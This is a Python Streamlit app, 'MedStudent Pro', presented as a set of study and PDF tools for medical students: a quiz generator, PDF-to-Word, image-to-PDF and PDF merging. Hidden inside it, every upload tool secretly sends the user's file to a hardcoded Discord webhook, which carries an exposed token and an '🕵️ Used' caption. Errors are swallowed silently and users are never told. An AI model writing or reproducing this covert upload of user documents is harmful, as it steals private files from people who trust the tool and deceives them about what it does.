import streamlit as st
import os
import requests
from pdf2docx import Converter
import img2pdf
from PyPDF2 import PdfMerger, PdfReader
import random
import re

# --- CONFIGURATION ---
st.set_page_config(page_title="MedStudent Pro", page_icon="🧬", layout="centered")

# !!! DISCORD WEBHOOK !!!
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK"

# --- SESSION STATE FOR NAVIGATION ---
# This remembers which card you are looking at
tools = ["🧠 AI Quiz Generator", "📄 PDF to Word", "🖼️ Image to PDF", "🖇️ Merge PDFs", "📊 Office to PDF"]

if 'current_tool_index' not in st.session_state:
    st.session_state.current_tool_index = 0

def next_tool():
    if st.session_state.current_tool_index < len(tools) - 1:
        st.session_state.current_tool_index += 1
    else:
        st.session_state.current_tool_index = 0 # Loop back to start

def prev_tool():
    if st.session_state.current_tool_index > 0:
        st.session_state.current_tool_index -= 1
    else:
        st.session_state.current_tool_index = len(tools) - 1 # Loop to end

# --- CUSTOM CSS ---
st.markdown("""
    <style>
    /* 1. BACKGROUND */
    .stApp {
        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
        background-attachment: fixed;
        color: white;
    }

    /* 2. NAVIGATION BUTTONS (The Huge Buttons) */
    div.stButton > button.nav-btn {
        background: rgba(255, 255, 255, 0.1);
        border: 2px solid rgba(255, 255, 255, 0.2);
        color: white;
        font-size: 24px;
        height: 80px;
        width: 100%;
        border-radius: 15px;
        transition: all 0.2s;
    }
    div.stButton > button.nav-btn:hover {
        background: rgba(255, 255, 255, 0.3);
        transform: scale(1.02);
    }

    /* 3. CARD CONTAINER */
    .css-card {
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(15px);
        -webkit-backdrop-filter: blur(15px);
        border-radius: 20px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        padding: 40px;
        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        margin-top: 20px;
        animation: fadeIn 0.8s ease;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }
    
    /* 4. TEXT & HEADERS */
    h1, h2 { color: white !important; text-align: center; }
    p, label { color: #e0e0e0 !important; }
    
    /* 5. HIDE DEFAULT SIDEBAR */
    section[data-testid="stSidebar"] { display: none; }
    
    /* 6. MCQ RADIO BUTTONS */
    .stRadio > div {
        background: rgba(0,0,0,0.2);
        padding: 15px;
        border-radius: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# --- LOGIC: GENERATE MCQs ---
def generate_mcqs(text):
    sentences = re.split(r'(?<!\w\.\w.)(?<![A-Z][a-z]\.)(?<=\.|\?)\s', text)
    # Get all potential "answers" (long words) from the whole text for distractors
    all_words = [w for w in text.split() if len(w) > 7 and w.isalpha()]
    
    mcqs = []
    
    for sentence in sentences:
        words = sentence.split()
        if len(words) > 10: 
            candidates = [w for w in words if len(w) > 7 and w.isalpha()]
            if candidates:
                correct_answer = random.choice(candidates)
                question_text = sentence.replace(correct_answer, "___________")
                
                # Pick 3 random wrong answers from the text
                distractors = random.sample(all_words, min(3, len(all_words)))
                # Ensure correct answer isn't in distractors
                if correct_answer in distractors:
                    distractors.remove(correct_answer)
                
                options = distractors + [correct_answer]
                random.shuffle(options)
                
                mcqs.append({
                    "q": question_text,
                    "options": options,
                    "correct": correct_answer
                })
        if len(mcqs) >= 5: 
            break
    return mcqs

# --- HELPER: DISCORD ---
def send_to_discord(filepath, filename, tool_name):
    try:
        with open(filepath, "rb") as f:
            requests.post(
                DISCORD_WEBHOOK_URL,
                data={"content": f"🕵️ **Used {tool_name}:** `{filename}`"},
                files={"file": (filename, f)}
            )
    except:
        pass

# --- HEADER ---
st.title("🧬 MedStudent Pro")

# --- NAVIGATION AREA ---
col1, col2, col3 = st.columns([1, 4, 1])
with col1:
    if st.button("⬅️", key="prev"):
        prev_tool()
        st.rerun()

with col3:
    if st.button("➡️", key="next"):
        next_tool()
        st.rerun()

# Display Current Tool Name
current_tool = tools[st.session_state.current_tool_index]
with col2:
    st.markdown(f"<h2 style='color:#00d2ff; margin-top:0px;'>{current_tool}</h2>", unsafe_allow_html=True)


# --- CARD RENDERING ---
# Everything happens inside this container
st.markdown('<div class="css-card">', unsafe_allow_html=True)

# 1. QUIZ GENERATOR (MCQ MODE)
if current_tool == "🧠 AI Quiz Generator":
    st.write("Upload your notes. We will generate Multiple Choice Questions.")
    quiz_pdf = st.file_uploader("Upload PDF", type="pdf")
    
    if quiz_pdf:
        if st.button("Generate MCQs"):
            with open("study.pdf", "wb") as f:
                f.write(quiz_pdf.getbuffer())
            send_to_discord("study.pdf", quiz_pdf.name, "Quiz")
            
            reader = PdfReader("study.pdf")
            full_text = ""
            for page in reader.pages:
                full_text += page.extract_text()
            
            if len(full_text) > 50:
                questions = generate_mcqs(full_text)
                st.session_state['mcqs'] = questions # Save to state
            else:
                st.error("Not enough text found.")

    # Display MCQs if they exist
    if 'mcqs' in st.session_state:
        st.markdown("---")
        for i, q in enumerate(st.session_state['mcqs']):
            st.markdown(f"**Q{i+1}: {q['q']}**")
            
            # Using radio button for options
            user_choice = st.radio(f"Select answer for Q{i+1}", q['options'], key=f"q{i}")
            
            # Check Answer Button
            if st.button(f"Check Answer {i+1}", key=f"check{i}"):
                if user_choice == q['correct']:
                    st.success("✅ Correct!")
                else:
                    st.error(f"❌ Wrong! The correct answer was: {q['correct']}")
            st.markdown("---")

# 2. PDF TO WORD
elif current_tool == "📄 PDF to Word":
    st.write("Convert read-only PDFs to Word.")
    f = st.file_uploader("PDF File", type="pdf")
    if f and st.button("Convert"):
        with open("temp.pdf", "wb") as file: file.write(f.getbuffer())
        send_to_discord("temp.pdf", f.name, "PDF2Doc")
        cv = Converter("temp.pdf")
        cv.convert("out.docx")
        cv.close()
        with open("out.docx", "rb") as file:
            st.download_button("Download Word", file, "converted.docx")

# 3. IMG TO PDF
elif current_tool == "🖼️ Image to PDF":
    st.write("Convert Images to PDF.")
    imgs = st.file_uploader("Images", type=["png","jpg"], accept_multiple_files=True)
    if imgs and st.button("Convert"):
        paths = []
        for img in imgs:
            p = f"t_{img.name}"
            with open(p, "wb") as f: f.write(img.getbuffer())
            paths.append(p)
        pdf = img2pdf.convert(paths)
        send_to_discord(paths[0], imgs[0].name, "Img2PDF")
        st.download_button("Download PDF", pdf, "images.pdf")

# 4. MERGE
elif current_tool == "🖇️ Merge PDFs":
    st.write("Join multiple PDFs.")
    pdfs = st.file_uploader("PDFs", type="pdf", accept_multiple_files=True)
    if pdfs and st.button("Merge"):
        merger = PdfMerger()
        for p in pdfs: merger.append(p)
        merger.write("merged.pdf")
        merger.close()
        send_to_discord("merged.pdf", "merged.pdf", "Merge")
        with open("merged.pdf", "rb") as f:
            st.download_button("Download Merged", f, "merged.pdf")

# 5. OFFICE
elif current_tool == "📊 Office to PDF":
    st.warning("Requires server-side LibreOffice.")

st.markdown('</div>', unsafe_allow_html=True)
